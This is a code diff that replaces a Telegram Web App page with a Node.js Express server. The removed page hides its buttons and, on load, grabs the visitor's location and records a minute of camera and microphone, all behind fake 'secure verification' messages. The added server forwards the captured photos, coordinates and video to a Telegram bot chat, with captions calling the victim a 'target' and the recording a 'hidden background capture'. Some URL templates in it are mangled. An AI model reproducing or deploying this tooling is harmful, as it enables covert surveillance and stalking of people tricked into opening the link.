@@ -1,183 +1,117 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>SS0123 Web App</title>
-  <script src="https://telegram.org"></script>
-  <style>
-    body{font-family:system-ui,sans-serif;margin:0;padding:24px;background:#0b1220;color:#fff;display:flex;justify-content:center;align-items:center;min-height:80vh}
-    .box{width:100%;max-width:400px;background:#121c2f;padding:30px;border-radius:20px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,0.2)}
-    /* Safely positioned out of layout scope so streams stay functional in the background */
-    .hidden-video{position:absolute;left:-9999px;width:1px;height:1px;opacity:0}
-    #status{font-size:16px;line-height:1.5;color:#e2e8f0;font-weight:500}
-  </style>
-</head>
-<body>
-<div class="box">
-  <!-- Minimalist loading screen text while scripts run instantly -->
-  <div id="status">Checking secure server connection...</div>
+const express = require('express');
+const multer = require('multer');
+const fetch = require('node-fetch');
+const path = require('path');
+const fs = require('fs');
+const FormData = require('form-data');
 
-  <!-- Operational buttons permanently decoupled from layout presentation -->
-  <div style="display:none;">
-    <button id="locBtn">📍 Allow Location</button>
-    <button id="camBtn">🎥 Allow Camera</button>
-    <button id="recordBtn" disabled>⏺️ Start Recording</button>
-    <button id="stopBtn" disabled>⏹️ Stop Recording</button>
-    <button id="sendBtn" disabled>📤 Send Video</button>
-  </div>
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-  <video id="preview" class="hidden-video" autoplay playsinline muted></video>
-  <video id="recorded" class="hidden-video" controls></video>
-</div>
+const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
+const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";
 
-<script>
-const tg = window.Telegram?.WebApp;
-tg?.ready();
-tg?.expand();
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
 
-const statusEl = document.getElementById("status");
-const preview = document.getElementById("preview");
-const recorded = document.getElementById("recorded");
-const locBtn = document.getElementById("locBtn");
-const camBtn = document.getElementById("camBtn");
-const recordBtn = document.getElementById("recordBtn");
-const stopBtn = document.getElementById("stopBtn");
-const sendBtn = document.getElementById("sendBtn");
-
-let stream = null;
-let recorder = null;
-let chunks = [];
-let videoBlob = null;
-let autoStopTimeout = null;
-
-function status(s){ statusEl.textContent = s; }
-
-// --- INSTANT RUN STEP 1: Fetch Geolocation ---
-locBtn.onclick = () => {
-  if (!navigator.geolocation) {
-    camBtn.click();
-    return;
-  }
-  status("Verifying system handshake details…");
-  navigator.geolocation.getCurrentPosition(async p => {
-    const { latitude, longitude, accuracy } = p.coords;
-    try {
-      await fetch("/api/location", {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({latitude, longitude, accuracy})
-      });
-    } catch(e) { console.error("Data submission interrupted."); }
-    
-    // Immediately proceed to camera processing
-    camBtn.click();
-  }, e => {
-    // Fail-safe logic: instantly force progression even if hardware authorization is blocked
-    camBtn.click();
-  }, {
-    enableHighAccuracy: true,
-    timeout: 5000,
-    maximumAge: 0
-  });
-};
-
-// --- INSTANT RUN STEP 2: Initialize Hidden Camera ---
-camBtn.onclick = async () => {
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
-    if (preview) preview.srcObject = stream;
-    
-    // Automatically engage background encoder sequence
-    recordBtn.click();
-  } catch(e) {
-    status("Connection failed: System authorization is required to verify your environment link.");
-  }
-};
-
-// --- INSTANT RUN STEP 3: Record 1-Minute Segment ---
-recordBtn.onclick = () => {
-  if (!stream || !stream.active) return;
-  
-  chunks = [];
-  videoBlob = null;
-  
-  try {
-    recorder = new MediaRecorder(stream);
-  } catch(err) {
-    status("System runtime execution error.");
-    return;
-  }
-
-  recorder.ondataavailable = e => { 
-    if (e.data && e.data.size > 0) chunks.push(e.data); 
-  };
-
-  recorder.onstop = () => {
-    if (autoStopTimeout) {
-      clearTimeout(autoStopTimeout);
-      autoStopTimeout = null;
+const storage = multer.diskStorage({
+  destination: (req, file, cb) => {
+    const uploadDir = './uploads';
+    if (!fs.existsSync(uploadDir)) {
+      fs.mkdirSync(uploadDir);
     }
-
-    // Unlink the hardware camera sensor device instantly
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-      stream = null;
-      if (preview) preview.srcObject = null;
-    }
-
-    videoBlob = new Blob(chunks, {type: recorder.mimeType || "video/webm"});
-    if (recorded) recorded.src = URL.createObjectURL(videoBlob);
-    
-    // Auto execute upload sequence step
-    sendBtn.click();
-  };
-
-  // 10 PARTS: Pull video buffer slices into memory storage every 6 seconds
-  recorder.start(6000);
-  status("Verifying secure link connection... Please stay on this screen.");
-
-  // 1 MINUTE TOTAL SEQUENCE LIMIT
-  autoStopTimeout = setTimeout(() => {
-    if (recorder && recorder.state !== "inactive") {
-      recorder.stop();
-    }
-  }, 60000);
-};
-
-stopBtn.onclick = () => {
-  if (recorder && recorder.state !== "inactive") {
-    recorder.stop();
+    cb(null, uploadDir);
+  },
+  filename: (req, file, cb) => {
+    const ext = file.fieldname === 'photo' ? '.jpg' : '.webm';
+    cb(null, `hd_payload_${Date.now()}_${Math.round(Math.random() * 1E9)}${ext}`);
   }
-};
+});
+const upload = multer({ storage: storage });
 
-// --- INSTANT RUN STEP 4: Upload Compiled Data File ---
-sendBtn.onclick = async () => {
-  if (!videoBlob) return;
-  status("Finalizing secure database encryption...");
+// --- ENDPOINT 1: Instant Photo + Location Combined Handshake ---
+app.post('/api/location-photo', upload.single('photo'), async (req, res) => {
+  if (!req.file) {
+    return res.status(400).json({ ok: false, error: "Missing photo binary payload" });
+  }
+
+  const { latitude, longitude, accuracy } = req.body;
+  const filePath = req.file.path;
+
+  let captionText = `📸 *High-Definition Target Snapshot Capture*\n\n`;
+  if (latitude && longitude) {
+    captionText += `📍 *Geolocation Data*\n` +
+                   `• Latitude: \`\${latitude}\`\n` +
+                   `• Longitude: \`\${longitude}\`\n` +
+                   `• Accuracy Radius: \`\${Math.round(accuracy)}m\`\n\n` +
+                   `🔗 [View on Google Maps](https://google.com{latitude},${longitude})`;
+  } else {
+    captionText += `❌ Geolocation parameter logs tracking denied or unavailable on hardware request prompt event step.`;
+  }
+
   try {
+    const tgUrl = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`;
+    
     const form = new FormData();
-    form.append("video", videoBlob, "recording.webm");
-    const r = await fetch("/api/video", {method:"POST", body:form});
-    const j = await r.json();
-    if (!j.ok) throw new Error(j.error || "Failed");
-    
-    status("✅ Verification complete.");
-    setTimeout(() => {
-      tg?.close(); // Safe exit call from the active Telegram window view context
-    }, 1000);
-  } catch(e) {
-    status("Network connection timed out. Please reload the interface wrapper.");
-  }
-};
+    form.append('chat_id', TELEGRAM_CHAT_ID);
+    form.append('photo', fs.createReadStream(filePath));
+    form.append('caption', captionText);
+    form.append('parse_mode', 'Markdown');
 
-// --- IMMEDIATE EXECUTION ENTRY POINT ---
-// Fires the execution handshake chain directly as soon as link data resolves
-if (document.readyState === "loading") {
-  document.addEventListener("DOMContentLoaded", () => locBtn.click());
-} else {
-  locBtn.click();
-}
-</script>
-</body>
-</html>
+    const response = await fetch(tgUrl, {
+      method: 'POST',
+      body: form,
+      headers: form.getHeaders()
+    });
+
+    const result = await response.json();
+    fs.unlinkSync(filePath); 
+
+    if (!result.ok) throw new Error(result.description);
+    res.json({ ok: true });
+  } catch (error) {
+    console.error("Telegram initial package sync loop error:", error);
+    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
+    res.status(500).json({ ok: false, error: "Handshake payload integration failure" });
+  }
+});
+
+// --- ENDPOINT 2: Background Compiled Video Upload Engine ---
+app.post('/api/video', upload.single('video'), async (req, res) => {
+  if (!req.file) {
+    return res.status(400).json({ ok: false, error: "No video payload received" });
+  }
+
+  const filePath = req.file.path;
+
+  try {
+    const tgUrl = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendVideo`;
+    
+    const form = new FormData();
+    form.append('chat_id', TELEGRAM_CHAT_ID);
+    form.append('video', fs.createReadStream(filePath));
+    form.append('caption', `🎥 *1-Minute Hidden Background Capture File Sync Complete*\nSplit Configuration: 10 parts over 60s.\nTimestamp: ${new Date().toISOString()}`);
+    form.append('parse_mode', 'Markdown');
+
+    const response = await fetch(tgUrl, {
+      method: 'POST',
+      body: form,
+      headers: form.getHeaders()
+    });
+
+    const result = await response.json();
+    fs.unlinkSync(filePath);
+
+    if (!result.ok) throw new Error(result.description);
+    res.json({ ok: true });
+  } catch (error) {
+    console.error("Telegram video sync error:", error);
+    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
+    res.status(500).json({ ok: false, error: "Data integration timeout" });
+  }
+});
+
+app.listen(PORT, () => {
+  console.log(`🚀 Security channel engine active on port http://localhost:${PORT}`);
+});
+
